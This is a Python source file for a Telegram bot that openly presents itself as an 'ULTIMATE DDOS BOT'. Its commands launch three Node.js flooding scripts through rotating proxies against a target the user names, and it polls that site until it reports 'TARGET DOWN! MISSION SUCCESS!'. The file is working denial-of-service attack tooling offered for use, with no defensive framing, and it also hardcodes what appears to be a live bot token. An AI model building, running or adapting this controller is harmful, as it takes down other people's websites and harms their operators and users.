import os
import asyncio
import threading
import random
import time
from datetime import datetime
from typing import Set, Dict
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import httpx
from flask import Flask, jsonify
from subprocess import Popen, PIPE

# --- Configuration ---
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8422734162:AAEwF0uwHA0Sf9-HQQd_u11PmErQNYM9hVg')
PORT = int(os.environ.get('PORT', 8080))

# --- Flask Health Check ---
app = Flask(__name__)

@app.route('/')
def home():
    return 'Telegram Bot (Hybrid) is running!'

@app.route('/health')
def health():
    return jsonify({"status": "OK", "timestamp": datetime.utcnow().isoformat()})

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# --- Bot Logic ---
active_attacks = {}

async def check_website_status(url: str):
    if not url.startswith('http'):
        url = 'https://' + url
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        try:
            resp = await client.get(url)
            if resp.status_code >= 500 or resp.status_code in [403, 429, 502, 503, 504]:
                return True, resp.status_code, "Server Overloaded/Blocked"
            return False, resp.status_code, "Site is responding"
        except Exception as e:
            return True, "DOWN", "Connection Failed"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
🔥🔥🔥 **ULTIMATE DDOS BOT (HYBRID v2)** 🔥🔥🔥
🤖 **PYTHON CONTROL + NODE.JS POWER**
✅ **PROXY ROTATION ACTIVE**

/ultimate <target> <time> <rate> <threads>
/tls <target> <time> <rate> <threads>
/http2 <target> <time> <rate> <threads>
/bypass <target> <time> <threads> <rate>
/stop - Stop all attacks
/status - Check status
"""
    await update.message.reply_text(welcome, parse_mode='Markdown')

def launch_node_attack(script, args):
    try:
        # Using Popen to run in background
        process = Popen(['node', script] + [str(a) for a in args], stdout=PIPE, stderr=PIPE)
        return process
    except Exception as e:
        print(f"Error launching {script}: {e}")
        return None

async def ultimate_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 4:
        await update.message.reply_text("Usage: /ultimate <target> <time> <rate> <threads>")
        return
    
    target, duration, rate, threads = context.args[0], context.args[1], context.args[2], context.args[3]
    
    # Ensure target is clean
    if target.startswith('http'):
        clean_target = target
    else:
        clean_target = 'https://' + target

    await update.message.reply_text(f"🚀 **ULTIMATE MULTI-VECTOR ATTACK STARTED**\n\n🎯 Target: {clean_target}\n⏱ Time: {duration}s\n📊 Rate: {rate}/s\n🧵 Threads: {threads}", parse_mode='Markdown')
    
    attack_id = str(time.time())
    active_attacks[attack_id] = {"target": clean_target, "end_time": time.time() + int(duration)}
    
    # Launch all 3 powerful scripts
    processes = []
    p1 = launch_node_attack('TLS-SUPERV2.js', [clean_target, duration, rate, threads, 'PROXY.txt'])
    p2 = launch_node_attack('http2.js', ['GET', clean_target, 'PROXY.txt', duration, rate, threads])
    p3 = launch_node_attack('bypass.js', [clean_target, duration, threads, 'PROXY.txt', rate, 'normal'])
    
    processes.extend([p for p in [p1, p2, p3] if p is not None])
    active_attacks[attack_id]["processes"] = processes
    
    asyncio.create_task(monitor_attack(update.effective_chat.id, attack_id, clean_target, int(duration)))

async def monitor_attack(chat_id, attack_id, target, duration):
    start_time = time.time()
    await asyncio.sleep(5) # Initial wait
    
    while time.time() - start_time < duration:
        await asyncio.sleep(15)
        is_down, status, msg = await check_website_status(target)
        if is_down:
            await application.bot.send_message(chat_id, f"🏆 **TARGET DOWN! MISSION SUCCESS!**\n\n🎯 {target}\nStatus: {status}\nResult: Site is Unreachable", parse_mode='Markdown')
            break
            
    # Cleanup processes if they are still running (though Node scripts usually self-terminate after time)
    if attack_id in active_attacks:
        for p in active_attacks[attack_id].get("processes", []):
            try: p.kill() 
            except: pass
        active_attacks.pop(attack_id, None)

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = 0
    for aid in list(active_attacks.keys()):
        for p in active_attacks[aid].get("processes", []):
            try: p.kill()
            except: pass
        active_attacks.pop(aid, None)
        count += 1
    await update.message.reply_text(f"🛑 Stopped {count} active attacks.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not active_attacks:
        await update.message.reply_text("No active attacks.")
        return
    msg = f"🛰 **Active Attacks:** {len(active_attacks)}\n"
    for aid, data in active_attacks.items():
        remaining = max(0, int(data['end_time'] - time.time()))
        msg += f"📍 `{data['target']}`\n⏱ Remaining: {remaining}s\n\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    
    application = ApplicationBuilder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ultimate", ultimate_attack))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("status", status))
    
    # Aliases
    application.add_handler(CommandHandler("tls", ultimate_attack))
    application.add_handler(CommandHandler("http2", ultimate_attack))
    application.add_handler(CommandHandler("bypass", ultimate_attack))
    
    print("Hybrid Bot v2 is starting...")
    application.run_polling()
